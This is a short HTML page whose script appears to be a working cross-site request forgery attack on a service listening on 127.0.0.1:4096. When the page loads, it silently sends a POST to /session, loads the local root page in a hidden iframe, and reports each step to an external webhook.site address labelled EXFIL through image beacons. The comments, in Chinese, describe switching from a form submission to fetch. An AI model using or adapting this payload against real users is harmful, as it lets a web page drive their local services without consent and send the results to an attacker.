<!doctype html>
<meta charset="utf-8">
<script>
const EXFIL = 'https://webhook.site/071c3611-058a-4ec0-a687-589cea6192db';
function log(s){ new Image().src = EXFIL + '/?s=' + encodeURIComponent(s) + '&t=' + Date.now(); }

window.onload = () => {
  log('start');

  // 原用于接收 form 响应的 iframe 已无用，但保留不影响（可删除）
  const f1 = document.createElement('iframe');
  f1.name = 'x';
  f1.style.display = 'none';
  document.body.appendChild(f1);

  // 替换原 form 提交：使用 fetch 发送等效的 curl 请求
  fetch('http://127.0.0.1:4096/session', {
    method: 'POST',
    headers: {
      'User-Agent': 'Mozilla/5.0 (Ubuntu; Linux x86_64; rv:125.0) Gecko/20100101 Firefox/125.0',
      'Connection': 'close',
      'Content-Type': 'application/json',
      'Accept-Encoding': 'gzip, deflate'
    },
    body: '{}'
  }).catch(err => {
    // 静默失败，或可选记录到外带（不干扰主要逻辑）
    log('fetch-error: ' + err.message);
  });
  log('csrf-start-sent');

  const f2 = document.createElement('iframe');
  f2.style.display = 'none';
  f2.onload = () => log('root-onload');
  f2.onerror = () => log('root-onerror');
  f2.src = 'http://127.0.0.1:4096/';
  document.body.appendChild(f2);
};
</script>
